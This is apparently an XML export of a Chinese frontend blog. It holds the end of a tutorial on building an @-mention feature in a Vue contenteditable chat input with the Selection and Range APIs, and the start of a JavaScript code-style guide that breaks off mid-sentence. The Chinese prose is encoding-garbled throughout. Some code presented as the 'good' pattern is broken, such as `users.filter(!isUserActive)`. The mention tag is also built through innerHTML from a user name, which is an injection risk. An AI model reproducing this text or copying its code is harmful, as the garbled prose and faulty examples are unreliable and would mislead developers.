document.getElementById('highlight')highlight.style.left = `$&#123;pos.x&#125;px`highlight.style.top = `$&#123;pos.y&#125;px`highlight.style.width = `$&#123;pos.width&#125;px`highlight.style.height = `$&#123;pos.height&#125;px` 1234#highlight &#123; position: absolute; background-color: aqua;&#125; é€‰ä¸­äº† 3 è¡Œï¼Œä½†ä¸æ˜¯å®Œæ•´çš„ 3 è¡Œï¼Œç»™å›žçš„ä¿¡æ¯æ˜¯ä¸€ä¸ªæœ€å°åŒ…è£¹é€‰åŒºçš„çŸ©å½¢ä½ç½®åæ ‡ï¼Œå¦‚æžœè¿˜éœ€è¦çŸ¥é“é€‰å–ä¸­æ¯ä¸ªå…ƒç´ æ›´è¯¦ç»†çš„ä½ç½®åæ ‡ï¼Œå¯ä»¥ä½¿ç”¨ Range.getClientRects()ï¼Œå®ƒè¿”å›žçš„æ˜¯ä¸€ä¸ª DOMRect å¯¹è±¡åˆ—è¡¨ï¼Œè¡¨ç¤º Range åœ¨å±å¹•ä¸Šæ‰€å çš„åŒºåŸŸã€‚è¿™ä¸ªåˆ—è¡¨ç›¸å½“äºŽæ±‡é›†äº†èŒƒå›´ä¸­æ‰€æœ‰å…ƒç´ è°ƒç”¨ Element.getClientRects()æ–¹æ³•æ‰€å¾—åˆ°çš„ç»“æžœã€‚ 1this.lastRange.getClientRects() Selection&amp;Range çš„ API å¾ˆå¤šï¼Œå¸¸ç”¨çš„å¤§è‡´ä»¥ä¸Šåˆ—ä¸¾çš„ï¼ŒåŒæ ·ç®€å•æ€»ç»“ä¸€ä¸‹ @çš„åŠŸèƒ½å®žçŽ°å¦‚æžœä½ å·²ç»ç†Ÿæ‚‰äº†ä¸Šé¢çš„ã€ŒåŸºæ“ã€ï¼Œé‚£ä¹ˆå¯¹äºŽå®žçŽ°ä¸€ä¸ª@åŠŸèƒ½å·²ç»æˆåŠŸäº†ä¸€åŠï¼Œå‰©ä¸‹çš„ä¸€åŠå°±æ˜¯æ€è·¯äº†ï¼Œå¤§è‡´åˆ†ä¸ºå¦‚ä¸‹å‡ æ­¥ï¼š ç›‘å¬ç”¨æˆ·è¾“å…¥äº†@å­—ç¬¦ï¼Œå±•ç¤ºç”¨æˆ·åˆ—è¡¨ï¼› ç‚¹å‡»ç”¨æˆ·ï¼Œå¯¼è‡´è¾“å…¥æ¡†å¤±ç„¦ï¼ŒåŠæ—¶ä¿å­˜å…‰æ ‡ä¿¡æ¯ï¼› ç‚¹å‡»å®Œæˆï¼Œç”¨æˆ·åˆ—è¡¨éšè—ï¼Œæ¢å¤è¾“å…¥æ¡†çš„å…‰æ ‡ï¼Œç„¶åŽåœ¨å…‰æ ‡åŽæ’å…¥ç”¨æˆ·åï¼› é¦–å…ˆæˆ‘ä»¬å†™å¥½ HTMLï¼ŒCSS éƒ¨åˆ†åœ¨è¿™é‡Œçœç•¥ 12345678910111213141516&lt;!-- å¯Œæ–‡æœ¬èŠå¤©æ¶ˆæ¯è¾“å…¥æ¡† --&gt;&lt;div class="chat-input" ref="chatInput" contenteditable="true" placeholder="è¯·è¾“å…¥å†…å®¹" @input="inputChatContent" @blur="chatContentBlur" @mouseup="chatContentMouseup"&gt;&lt;/div&gt;&lt;!-- ç”¨æˆ·åˆ—è¡¨æµ®çª— --&gt;&lt;ul class="popper" v-show="isShowUserList" ref="popper" :style="popperStyle" v-click-out-hide&gt; &lt;li v-for="(item, index) in userList" :key="index" @click="selectUser(item)"&gt; &lt;el-row&gt;&#123;&#123;item.name&#125;&#125;&lt;/el-row&gt; &lt;/li&gt;&lt;/ul&gt; æŽ¥ç€æˆ‘ä»¬ç›‘å¬å¯Œæ–‡æœ¬çš„inputäº‹ä»¶ï¼Œå½“ç›‘å¬åˆ° @ å­—ç¬¦ï¼Œå±•ç¤ºç”¨æˆ·åˆ—è¡¨ï¼Œå¦åˆ™éšè—ã€‚äºŽæ­¤åŒæ—¶ï¼Œä½¿ç”¨ Range.getBoundingClientRect() èŽ·å–å…‰æ ‡çš„ä½ç½®ï¼Œè¿™æ ·æ‰èƒ½å°†ç”¨æˆ·åˆ—è¡¨æµ®æ¡†å®šä½åˆ°å…‰æ ‡é™„è¿‘ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/** * è¾“å…¥èŠå¤©å†…å®¹ * @param &#123;*&#125; ev */inputChatContent(ev) &#123; if (ev.data === '@') &#123; const pos = this.getCaretPos() this.showUserList() this.$nextTick(() =&gt; &#123; this.setUserListPos(pos) &#125;) &#125; else &#123; this.hideUserList() &#125;&#125;,/** * èŽ·å–å…‰æ ‡ä½ç½® * @returns */getCaretPos() &#123; const range = this.getRange() const pos = range.getBoundingClientRect() return pos&#125;,/** * è®¾ç½®ç”¨æˆ·åˆ—è¡¨çš„ä½ç½® * @param &#123;*&#125; pos */setUserListPos(pos) &#123; const $popper = this.$refs.popper const panelWidth = $popper.offsetWidth const panelHeight = $popper.offsetHeight const &#123; x, y &#125; = pos this.popperStyle = &#123; top: y - panelHeight - 20 + 'px', left: x - panelWidth / 2 + 'px' &#125;&#125;,hideUserList() &#123; this.isShowUserList = false&#125;,showUserList() &#123; this.isShowUserList = true&#125;, å½“ç‚¹å‡»ç”¨æˆ·åˆ—è¡¨æ—¶ï¼Œè¾“å…¥æ¡†ä¼šå¤±ç„¦ï¼Œæ­¤æ—¶å…ˆå°†å…‰æ ‡ä¿å­˜èµ·æ¥ï¼ŒåŒæ—¶åˆ›å»ºå°†è¦æ’å…¥çš„ç”¨æˆ·åæ–‡æœ¬èŠ‚ç‚¹ï¼Œç„¶åŽæ¢å¤å…‰æ ‡ï¼Œå† Range.insetNode() å°†ç”¨æˆ·åæ–‡æœ¬èŠ‚ç‚¹ Range.insetNode() æ’å…¥åˆ°é€‰åŒºï¼Œæœ€åŽ Selection.removeAllRanges() ç§»é™¤æ‰€æœ‰é¡µé¢é€‰åŒºï¼ŒSelection.addRange() æ’å…¥å½“å‰é€‰åŒºã€‚ 1234567891011121314151617181920212223242526272829303132333435363738 /** * é€‰æ‹©ç”¨æˆ· */selectUser(user) &#123; // è®©å¤±ç„¦äº‹ä»¶å…ˆæ‰§è¡Œ setTimeout(() =&gt; &#123; this.hideUserList() this.insertContent(user) &#125;)&#125;,/** * æ¢å¤å…‰æ ‡ */restoreCaret() &#123; if (this.lastRange) &#123; const selection = window.getSelection() selection.removeAllRanges() selection.addRange(this.lastRange) &#125;&#125;,/** * æ’å…¥å†…å®¹ * @param &#123;*&#125; data */insertContent(data) &#123; this.restoreCaret() // è¿˜åŽŸå…‰æ ‡ const selection = window.getSelection() const range = selection.getRangeAt(0) range.collapse(false) // æŠ˜å é€‰åŒºï¼Œå…‰æ ‡ç§»åˆ°æœ€åŽ range.insertNode(data.content) range.collapse(false) selection.removeAllRanges() selection.addRange(range)&#125; @åŠŸèƒ½åŠ å¼ºç‰ˆä»¥ä¸Šæ˜¯ç®€å•å®žçŽ°äº†@ åŠŸèƒ½ï¼Œåœ¨å®žé™…åº”ç”¨ä¸­è¿˜æœ‰æ›´å¤šæå‡ç”¨æˆ·ä½“éªŒçš„åœ°æ–¹ å½“å‰é€šè¿‡é€€å›žé”®åˆ é™¤ç”¨æˆ·å@xxxï¼Œå‘çŽ°åˆ é™¤çš„æ˜¯é€ä¸ªå­—ç¬¦ï¼Œè€Œç”¨æˆ·æ›´å¤šæƒ³è¦çš„æ˜¯æŒ‰ä¸€ä¸‹é€€å›žé”®ï¼Œåˆ é™¤æ•´ä¸ªç”¨æˆ·åï¼› å‘é€å‡ºåŽ»æ€Žæ ·è§£æžæˆåŽç«¯èƒ½è¯†åˆ«çš„ç‰¹å®šçš„æ•°æ®ç»“æž„ï¼Œå¹¶ä¸”ç‰¹å®šçš„æ•°æ®ç»“æž„æ€Žæ ·è½¬æ¢å›žå¯Œæ–‡æœ¬å‘¢ï¼Ÿ æš‚ä¸”å¸¦è¿™ä¸¤ä¸ªé—®é¢˜ï¼ŒæŽ¥ç€æ€Žæ ·è§£å†³å‘¢ï¼Ÿ å®žçŽ°æ•´ä½“åˆ é™¤ç”¨æˆ·åé¦–å…ˆæƒ³åˆ°çš„æ˜¯ç”¨æˆ·åæ’å…¥å¯Œæ–‡æœ¬æ˜¯ä¸€ä¸ªæ ‡ç­¾ï¼ŒæŒ‰ä¸€ä¸‹é€€å›žé”®ï¼Œå°±èƒ½åˆ é™¤æ•´ä¸ªæ ‡ç­¾ï¼Ÿç­”æ¡ˆæ˜¯ä¸èƒ½ï¼Œå¯Œæ–‡æœ¬æ ‡ç­¾é‡Œçš„æ–‡å­—åœ¨æ²¡æœ‰é€‰ä¸­æƒ…å†µä¸‹éƒ½æ˜¯é€ä¸ªåˆ é™¤ã€‚é™¤éžè¯¥å…ƒç´ æ˜¯ä¸å¯ç¼–è¾‘å…ƒç´  span.contentEditable = falseã€‚è¿™é‡Œè¦å°† @xxxæ”¾å…¥ä¸å¯ç¼–è¾‘æ ‡ç­¾ä¸­ï¼Œåˆ é™¤çš„æ—¶å€™æ‰èƒ½ä¸€èµ·åˆ ã€‚æ­¤æ—¶ä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæ¯æ¬¡æ’å…¥ç”¨æˆ·æ ‡ç­¾åŽï¼Œå¤šå‡ºä¸€ä¸ª@ å­—ç¬¦ï¼Œæ‰€ä»¥åœ¨ä¹‹å‰å·²ç»è¾“å…¥çš„ @ å­—ç¬¦å°±éœ€è¦åœ¨æ’å…¥æ ‡ç­¾å‰éœ€è¦åˆ é™¤æŽ‰ã€‚å…·ä½“å®žçŽ°æ˜¯æ‰¾åˆ°é€‰åŒºæ‰€åœ¨çš„å¼€å§‹èŠ‚ç‚¹ Range.startContainerï¼Œå†æ‰¾åˆ°é€‰åŒºç»“æŸä½ç½®çš„åç§»é‡ Range.endOffset ï¼Œæ­£å¸¸æƒ…å†µä¸‹é€‰åŒºç»“æŸä½ç½®çš„å‰ä¸€ä¸ªå°±æ˜¯ @å­—ç¬¦ï¼Œé€‰ä¸­åˆ é™¤å³å¯ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566/** * åˆ é™¤è¾“å…¥æ¡†ä¸­å…‰æ ‡ä½ç½®çŽ°æœ‰çš„@å­—ç¬¦ */deleteCaretAtCode() &#123; const range = this.getRange() // å…‰æ ‡å¼€å§‹èŠ‚ç‚¹å’Œå…‰æ ‡åœ¨èŠ‚ç‚¹ä¸Šçš„åç§»é‡ï¼Œæ‰¾åˆ°å…‰æ ‡å‡†ç¡®ä½ç½®ï¼Œé€‰ä¸­å…‰æ ‡ä½ç½®å‰ä¸€ä¸ªå­—ç¬¦èŒƒå›´å¹¶åˆ é™¤ï¼Œ const node = range.startContainer const end = range.endOffset // å¼€å§‹èŠ‚ç‚¹å†…å®¹æœ€åŽä¸€ä¸ªå­—ç¬¦æ˜¯@ï¼Œåˆ é™¤ï¼Œå¦åˆ™ä¸åˆ é™¤ if (node.textContent[end - 1] === '@') &#123; range.setStart(node, end ? end - 1 : 0) range.deleteContents() &#125;&#125;,/** * è½¬æ¢è¦æ’å…¥å…‰æ ‡ä½ç½®çš„å†…å®¹ * @param &#123;*&#125; data */parseContent(data) &#123; const &#123; type = 'text', name &#125; = data let content = null // type æ˜¯æ’å…¥å†…å®¹ç±»åž‹ï¼Œå¯èƒ½æ˜¯æ–‡æœ¬ã€@æ ‡ç­¾ã€å›¾ç‰‡ã€è¡¨æƒ…ç­‰ if (type === 'text') &#123; content = document.createTextNode(name) &#125; else if (type === 'at') &#123; // åˆ é™¤è¾“å…¥æ¡†ä¸­å…‰æ ‡ä½ç½®çŽ°æœ‰çš„@å­—ç¬¦ this.deleteCaretAtCode() const $span = document.createElement('span') $span.contentEditable = false $span.classList.add('tag') $span.innerHTML = `@$&#123;name&#125;` // æ’å…¥ä¸€ä¸ªç©ºæ ¼å­—ç¬¦ï¼ˆ\u0010ï¼‰åˆ°@æ ‡ç­¾åŽé¢ï¼Œå¯ä»¥è§£å†³éƒ¨åˆ†æµè§ˆå™¨ä¸Šå…‰æ ‡åœ¨èŠå¤©è¾“å…¥æ¡†åŽé¢ const $space = document.createTextNode('\u0010') const frag = document.createDocumentFragment() frag.appendChild($span) frag.appendChild($space) content = frag &#125; return content&#125;, /** * æ’å…¥å†…å®¹ * @param &#123;*&#125; data */insertContent(data) &#123; this.restoreCaret() // è¿˜åŽŸå…‰æ ‡ const selection = window.getSelection() const range = selection.getRangeAt(0) range.collapse(false) // æŠ˜å é€‰åŒºï¼Œå…‰æ ‡ç§»åˆ°æœ€åŽ const pc = this.parseContent(data) range.insertNode(pc) range.collapse(false) selection.removeAllRanges() selection.addRange(range)&#125; ä¸€äº›å…¼å®¹å¤„ç†å¯èƒ½ä½ å·²ç»æ³¨æ„åˆ°äº†ï¼Œåœ¨ç”¨æˆ·æ ‡ç­¾@xxxåŽé¢è¿½åŠ äº†ä¸€ä¸ªç©ºæ ¼å­—ç¬¦ï¼Œè¿™æ ·å…‰æ ‡å¯ä»¥æ˜¾ç¤ºå‡ºæ¥ï¼Œä¸è¿‡åœ¨ç”¨é€€æ ¼é”®éœ€è¦æŒ‰ä¸¤æ¬¡åˆ é™¤æ ‡ç­¾ï¼Œè¿™é‡Œå…·ä½“çš„è¦çœ‹ä¸šåŠ¡éœ€è¦äº†ã€‚æ³¨æ„çš„æ˜¯åœ¨ Mac Chromeï¼ˆV104ï¼‰ä¸Šï¼Œå¦‚æžœåœ¨æ ‡ç­¾åŽé¢ä¸è¿½åŠ å­—ç¬¦ï¼Œå…‰æ ‡ä¼šåœ¨å¤–å±‚å¯Œæ–‡æœ¬æ ‡ç­¾åŽé¢ï¼Œåœ¨éžç¼–è¾‘æ ‡ç­¾åŽåŠ ä»»æ„å­—ç¬¦æ˜¯æ­£å¸¸çš„ã€‚ç»è¿‡æµ‹è¯• Firefox æµè§ˆå™¨æœ‰è¿™æ ·çš„ bugï¼šç”¨æˆ·æ ‡ç­¾@xxxæ²¡æœ‰æ­£ç¡®çš„æ’å…¥åˆ°å¯Œæ–‡æœ¬è¾“å…¥æ¡†çš„ä½ç½®ï¼Œè€Œæ˜¯æ’å…¥åˆ°äº†ç”¨æˆ·åˆ—è¡¨ç‚¹å‡»çš„é‚£ä¸€é¡¹ä¸Šäº†ã€‚å¤§èƒ†æŽ¨æµ‹ Firefox å°†æ™®é€šå…ƒç´ ä¹Ÿå¯ä»¥è®¾ç½®å…‰æ ‡ï¼Œè¿™æ ·ç‚¹å‡»ç”¨æˆ·åˆ—è¡¨æŸä¸€é¡¹å…ƒç´ æ—¶ï¼Œè¯¥å…ƒç´ èŽ·å¾—å…‰æ ‡ï¼Œå†èŽ·å–æ–°é€‰åŒº selection.getRangeAt(0)å…¶å®žæ˜¯åœ¨ç‚¹å‡»çš„è¿™ä¸ªå…ƒç´ ä¸Šï¼Œéžæ¢å¤çš„å¯Œæ–‡æœ¬è¾“å…¥æ¡†ä¸Šï¼Œç„¶åŽæ’å…¥ç”¨æˆ·æ ‡ç­¾ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„æƒ…æ™¯ã€‚è¿™é‡Œæˆ‘çš„è§£å†³æ–¹æ³•æ˜¯å°†ç”¨æˆ·åˆ—è¡¨é¡¹è®¾ç½®ä¸ºä¸å¯é€‰ä¸­çš„ï¼Œè‡ªç„¶å°±æ— æ³•èŽ·å–å…‰æ ‡ã€‚ 1234567.popper li &#123; /* ç”¨æˆ·ä¸èƒ½é€‰ä¸­æ–‡æœ¬ firfox éžç¼–è¾‘ç¼–è¾‘å…ƒç´ ä¹Ÿå¯é€‰ä¸­ */ user-select: none; -webkit-user-select: none; list-style: none; padding: 10px;&#125; æˆ‘ä»¬å†çœ‹çœ‹å† Safari ä¸Šçš„è¡¨çŽ°å‘çŽ°æ˜¯æ²¡æœ‰æŒ‰ç…§é¢„æƒ³çš„åˆ é™¤æŽ‰å‰ç½®çš„@å­—ç¬¦çš„ï¼ŒæŸ¥çœ‹æŽ§åˆ¶å°æœ‰æŠ¥é”™å¤§è‡´æ„æ€æ˜¯ selection.getRangeAt(0)ä¸­ç¬¬ 0 ä½æ˜¯è¶…å‡ºå…è®¸çš„èŒƒå›´çš„ï¼Œéš¾é“åœ¨è¾“å…¥æ¡†å¤±åŽ»ç„¦ç‚¹çš„æƒ…æ™¯ä¸‹ï¼ŒSafari é»˜è®¤å°†é€‰åŒºç»™æ¸…ç©ºäº†ï¼Ÿé€šè¿‡å®žéªŒå‘çŽ°ç¡®å®žå¦‚æ­¤ 123// è¾“å…¥æ¡†å¤±åŽ»ç„¦ç‚¹å’ŒèŽ·å–ç„¦ç‚¹æ—¶æ‰“å°é€‰åŒºä¸ªæ•°const selection = window.getSelection()console.log('selection.rangeCount: ', selection.rangeCount) è€Œæ­£å¸¸å…¶ä»–æµè§ˆå™¨é€‰åŒºä¸ªæ•°ä¿æŒä¸å˜é‚£æ€Žæ ·è§£å†³è¿™ç§æƒ…æ™¯å‘¢ï¼Ÿæˆ‘ä»¬æ˜¯åœ¨è¾“å…¥æ¡†å¤±ç„¦çš„æ—¶å€™ä¿å­˜é€‰åŒºçš„ï¼Œæ­¤æ—¶ Safari å·²ç»æ¸…ç©ºäº†é€‰åŒºï¼Œå¯¼è‡´è¿™ä¸ªæ—¶å€™ä¿å­˜çš„é€‰åŒºæ˜¯ç©ºçš„ï¼Œå› æ­¤æˆ‘ä»¬è¦å°†é€‰åŒºä¿å­˜å‰ç½®ä¸€ä¸‹ï¼Œåœ¨è¾“å…¥@å­—ç¬¦æ—¶å€™å°±ä¿å­˜ä¸€ä¸‹é€‰åŒºï¼ˆå…‰æ ‡ï¼‰ï¼Œå¯ä»¥è¿™æ ·åš 1234567891011121314151617/** * è¾“å…¥èŠå¤©å†…å®¹ * @param &#123;*&#125; ev */inputChatContent(ev) &#123; if (ev.data === '@') &#123; // åœ¨è¾“å…¥@å­—ç¬¦æ—¶å€™å°±ä¿å­˜ä¸€ä¸‹å…‰æ ‡ this.saveCaret() const pos = this.getCaretPos() this.showUserList() this.$nextTick(() =&gt; &#123; this.setUserListPos(pos) &#125;) &#125; else &#123; this.hideUserList() &#125;&#125;, æ€»ç»“æœ¬æ–‡ä»¥â€œå®Œç¾Žâ€å®žçŽ°ä¸€ä¸ª@ åŠŸèƒ½ä¸ºå¼•å­ï¼Œä»‹ç»äº† input/textarea æ–‡æœ¬è¾“å…¥æ¡†å’Œå¯Œæ–‡æœ¬çš„é€‰åŒºæ“ä½œã€‚å¹¶åœ¨æ­¤åŸºç¡€ä¸Šç»“åˆ@ åŠŸèƒ½çš„å®žçŽ°æ€è·¯ï¼Œè¾¹å®žè·µè¾¹æ”¹è¿›ï¼Œä¸ä¹æœ‰å¾ˆå¤šåœ°æ–¹æ²¡æœ‰è€ƒè™‘å‘¨å…¨çš„ï¼Œä»…å½“ä½œå­¦ä¹ çš„ demo å°±å¥½ï¼Œæ¬¢è¿ŽæŒ‡æ­£ã€‚æœ¬æ–‡åœ¨çº¿æ¡ˆä¾‹å¯ä»¥ç‚¹è¿™é‡Œï¼Œå®Œï½ž]]></content>
      <tags>
        <tag>javascript html5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç»„å‘˜é‡æž„ä»£ç åƒå¥‡ç™¾æ€ªï¼Œç›´æŽ¥JSã€ES6å’ŒVueè§„èŒƒç»™ä¸€æ¢­å­]]></title>
    <url>%2F2021%2F12%2F01%2Fstyle%2F</url>
    <content type="text"><![CDATA[è¿‘æœŸç»„å‘˜æŽ¥æ‰‹äº†ä¸€ä¸ªâ€œå¤è€â€œçš„åˆå§‹ç”±åŽç«¯å¤§ä½¬å†™çš„å‰ç«¯é¡¹ç›®ï¼Œä¸šåŠ¡å±‚é¢çš„ç»„ä»¶å¤ç”¨ï¼Œå…¨é æ˜¯ copy ç›¸åŒä»£ç å’±ä¸è¯´ï¼Œç»è¿‡ä¸åŒå¤§ä½¬ä»¬çš„ç»´æŠ¤ï¼Œä»£ç é£Žæ ¼æ›´æ˜¯åƒå¥‡ç™¾æ€ªã€‚è¯¥å‰ç«¯é¡¹ç›®è¿˜åœ¨æ­£å¸¸è¿­ä»£æ›´æ–°ï¼Œåˆä¸å¯èƒ½é‡å†™ï¼Œé¢å¯¹ ðŸ’© ä¸€æ ·çš„ä»£ç ï¼Œä¸¤ä¸ªæŽ¥æ‰‹çš„å°å‰ç«¯æŠ±ç€æ¬²å“­æ— æ³ªï¼Œç‘Ÿç‘Ÿå‘æŠ–ã€‚è§çŠ¶ï¼Œåªèƒ½å®‰æ…°ä¹‹ï¼Œæš‚æ—¶å‘æŒ¥å•Š Q ç²¾ç¥žï¼Œè§„èŒƒè‡ªå·±çš„æ–°ä»£ç ï¼Œç„¶åŽæ¯æ¬¡è¿­ä»£å¼€å‘ä»»åŠ¡é‡æž„ä¸€ä¸¤ä¸ªæ—§ç»„ä»¶ï¼Œæ­¤è¿‡ç¨‹æŒç»­ 2-3 ä¸ªæœˆåŽï¼Œä¸Š eslint å’Œ prettier è‡ªåŠ¨åŒ–æ£€æµ‹è¯­æ³•å’Œæ ¼å¼åŒ–ä»£ç ã€‚æœ¬ç€â€œä»£ç ä¸è§„èŒƒï¼Œæ–°äººä¸¤è¡Œæ³ªâ€çš„è­¦ç¤ºï¼Œæ€»ç»“å‡ºå¦‚ä¸‹ JavaScripã€ES6 å’Œ Vue å•æ–‡ä»¶ç»„ä»¶ç›¸å…³ä»£ç é£Žæ ¼æ¡ˆä¾‹ï¼Œä¾›å¤§å®¶å‚è€ƒã€‚ Javascript ä»£ç é£Žæ ¼ä½¿ç”¨æœ‰æ„ä¹‰çš„å˜é‡åç§°å˜é‡çš„åç§°åº”è¯¥æ˜¯å¯æè¿°ï¼Œæœ‰æ„ä¹‰çš„ï¼Œ JavaScript å˜é‡éƒ½åº”è¯¥é‡‡ç”¨é©¼å³°å¼å¤§å°å†™ ( camelCase) å‘½åã€‚ 1234567891011// bad âŒconst foo = 'JDoe@example.com'const bar = 'John'const age = 23const qux = true// good âœ…const email = 'John@example.com'const firstName = 'John'const age = 23const isActive = true å¸ƒå°”å˜é‡é€šå¸¸éœ€è¦å›žç­”ç‰¹å®šé—®é¢˜ï¼Œä¾‹å¦‚ï¼š 123isActivedidSubscribehasLinkedAccount é¿å…æ·»åŠ ä¸å¿…è¦çš„ä¸Šä¸‹æ–‡å½“å¯¹è±¡æˆ–ç±»å·²ç»åŒ…å«äº†ä¸Šä¸‹æ–‡çš„å‘½åæ—¶ï¼Œä¸è¦å†å‘å˜é‡åç§°æ·»åŠ å†—ä½™çš„ä¸Šä¸‹æ–‡ã€‚ 123456789101112131415161718192021// bad âŒconst user = &#123; userId: '296e2589-7b33-400a-b762-007b730c8e6d', userEmail: 'JDoe@example.com', userFirstName: 'John', userLastName: 'Doe', userAge: 23&#125;user.userId//good âœ…const user = &#123; id: '296e2589-7b33-400a-b762-007b730c8e6d', email: 'JDoe@example.com', firstName: 'John', lastName: 'Doe', age: 23&#125;user.id é¿å…ç¡¬ç¼–ç å€¼1234567// bad âŒsetTimeout(clearSessionData, 900000)//good âœ…const SESSION_DURATION_MS = 15 * 60 * 1000setTimeout(clearSessionData, SESSION_DURATION_MS) ä½¿ç”¨æœ‰æ„ä¹‰çš„å‡½æ•°åç§°å‡½æ•°åç§°éœ€è¦æè¿°å‡½æ•°çš„å®žé™…ä½œç”¨ï¼Œå³ä½¿å¾ˆé•¿ä¹Ÿæ²¡å…³ç³»ã€‚å‡½æ•°åç§°é€šå¸¸ä½¿ç”¨åŠ¨è¯ï¼Œä½†è¿”å›žå¸ƒå°”å€¼çš„å‡½æ•°å¯èƒ½æ˜¯ä¸ªä¾‹å¤– â€” å®ƒå¯ä»¥é‡‡ç”¨ æ˜¯æˆ–å¦ é—®é¢˜çš„å½¢å¼ï¼Œå‡½æ•°åä¹Ÿåº”è¯¥æ˜¯é©¼å³°å¼çš„ã€‚ 1234567891011121314151617// bad âŒfunction toggle() &#123; // ...&#125;function agreed(user) &#123; // ...&#125;//good âœ…function toggleThemeSwitcher() &#123; // ...&#125;function didAgreeToAllTerms(user) &#123; // ...&#125; é™åˆ¶å‚æ•°çš„æ•°é‡å°½ç®¡è¿™æ¡è§„åˆ™å¯èƒ½æœ‰äº‰è®®ï¼Œä½†å‡½æ•°æœ€å¥½æ˜¯æœ‰ 3 ä¸ªä»¥ä¸‹å‚æ•°ã€‚å¦‚æžœå‚æ•°è¾ƒå¤šå¯èƒ½æ˜¯ä»¥ä¸‹ä¸¤ç§æƒ…å†µä¹‹ä¸€ï¼š è¯¥å‡½æ•°åšçš„äº‹æƒ…å¤ªå¤šï¼Œåº”è¯¥æ‹†åˆ†ã€‚ ä¼ é€’ç»™å‡½æ•°çš„æ•°æ®ä»¥æŸç§æ–¹å¼ç›¸å…³ï¼Œå¯ä»¥ä½œä¸ºä¸“ç”¨æ•°æ®ç»“æž„ä¼ é€’ã€‚ 123456789101112131415161718192021// bad âŒfunction sendPushNotification(title, message, image, isSilent, delayMs) &#123; // ...&#125;sendPushNotification('New Message', '...', 'http://...', false, 1000)//good âœ…function sendPushNotification(&#123; title, message, image, isSilent, delayMs &#125;) &#123; // ...&#125;const notificationConfig = &#123; title: 'New Message', message: '...', image: 'http://...', isSilent: false, delayMs: 1000&#125;sendPushNotification(notificationConfig) é¿å…åœ¨ä¸€ä¸ªå‡½æ•°ä¸­åšå¤ªå¤šäº‹æƒ…ä¸€ä¸ªå‡½æ•°åº”è¯¥ä¸€æ¬¡åšä¸€ä»¶äº‹ï¼Œè¿™æœ‰åŠ©äºŽå‡å°‘å‡½æ•°çš„å¤§å°å’Œå¤æ‚æ€§ï¼Œä½¿æµ‹è¯•ã€è°ƒè¯•å’Œé‡æž„æ›´å®¹æ˜“ã€‚ 12345678910111213141516171819// bad âŒfunction pingUsers(users) &#123; users.forEach((user) =&gt; &#123; const userRecord = database.lookup(user) if (!userRecord.isActive()) &#123; ping(user) &#125; &#125;)&#125;//good âœ…function pingInactiveUsers(users) &#123; users.filter(!isUserActive).forEach(ping)&#125;function isUserActive(user) &#123; const userRecord = database.lookup(user) return userRecord.isActive()&#125; é¿å…ä½¿ç”¨å¸ƒå°”æ ‡å¿—ä½œä¸ºå‚æ•°å‡½æ•°å«æœ‰å¸ƒå°”æ ‡å¿—çš„å‚æ•°æ„å‘³è¿™ä¸ªå‡½æ•°æ˜¯å¯ä»¥è¢«ç®€åŒ–çš„ã€‚ 1234567891011121314151617// bad âŒfunction createFile(name, isPublic) &#123; if (isPublic) &#123; fs.create(`./public/$&#123;name&#125;`) &#125; else &#123; fs.create(name) &#125;&#125;//good âœ…function createFile(name) &#123; fs.create(name)&#125;function createPublicFile(name) &#123; createFile(`./public/$&#123;name&#125;`)&#125; é¿å…å†™é‡å¤çš„ä»£ç å¦‚æžœä½ å†™äº†é‡å¤çš„ä»£ç ï¼Œæ¯æ¬¡æœ‰é€»è¾‘æ”¹å˜ï¼Œä½ éƒ½éœ€è¦æ”¹åŠ¨å¤šä¸ªä½ç½®ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344// bad âŒfunction renderCarsList(cars) &#123; cars.forEach((car) =&gt; &#123; const price = car.getPrice() const make = car.getMake() const brand = car.getBrand() const nbOfDoors = car.getNbOfDoors() render(&#123; price, make, brand, nbOfDoors &#125;) &#125;)&#125;function renderMotorcyclesList(motorcycles) &#123; motorcycles.forEach((motorcycle) =&gt; &#123; const price = motorcycle.getPrice() const make = motorcycle.getMake() const brand = motorcycle.getBrand() const seatHeight = motorcycle.getSeatHeight() render(&#123; price, make, brand, nbOfDoors &#125;) &#125;)&#125;//good âœ…function renderVehiclesList(vehicles) &#123; vehicles.forEach((vehicle) =&gt; &#123; const price = vehicle.getPrice() const make = vehicle.getMake() const brand = vehicle.getBrand() const data = &#123; price, make, brand &#125; switch (vehicle.type) &#123; case 'car': data.nbOfDoors = vehicle.getNbOfDoors() break case 'motorcycle': data.seatHeight = vehicle.getSeatHeight() break &#125; render(data) &#125;)&#125; é¿å…å‰¯ä½œç”¨åœ¨ JavaScript ä¸­ï¼Œä½ åº”è¯¥æ›´å–œæ¬¢å‡½æ•°å¼æ¨¡å¼è€Œä¸æ˜¯å‘½ä»¤å¼æ¨¡å¼ã€‚æ¢å¥è¯è¯´ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹æˆ‘ä»¬éƒ½åº”è¯¥ä¿æŒå‡½æ•°çº¯æ´ã€‚å‰¯ä½œç”¨å¯èƒ½ä¼šä¿®æ”¹å…±äº«çŠ¶æ€å’Œèµ„æºï¼Œä»Žè€Œå¯¼è‡´ä¸€äº›å¥‡æ€ªçš„é—®é¢˜ã€‚æ‰€æœ‰çš„å‰¯ä½œç”¨éƒ½åº”è¯¥é›†ä¸­ç®¡ç†ï¼Œä¾‹å¦‚ä½ éœ€è¦æ›´æ”¹å…¨å±€å˜é‡æˆ–ä¿®æ”¹æ–‡ä»¶ï¼Œå¯ä»¥ä¸“é—¨å†™ä¸€ä¸ª util æ¥åšè¿™ä»¶äº‹ã€‚ 1234567891011121314151617181920212223// bad âŒlet date = '21-8-2021'function splitIntoDayMonthYear() &#123; date = date.split('-')&#125;splitIntoDayMonthYear()// Another function could be expecting date as a stringconsole.log(date) // ['21', '8', '2021'];//good âœ…function splitIntoDayMonthYear(date) &#123; return date.split('-')&#125;const date = '21-8-2021'const newDate = splitIntoDayMonthYear(date)// Original vlaue is intactconsole.log(date) // '21-8-2021';console.log(newDate) // ['21', '8', '2021']; å¦å¤–ï¼Œå¦‚æžœä½ å°†ä¸€ä¸ªå¯å˜å€¼ä¼ é€’ç»™å‡½æ•°ï¼Œä½ 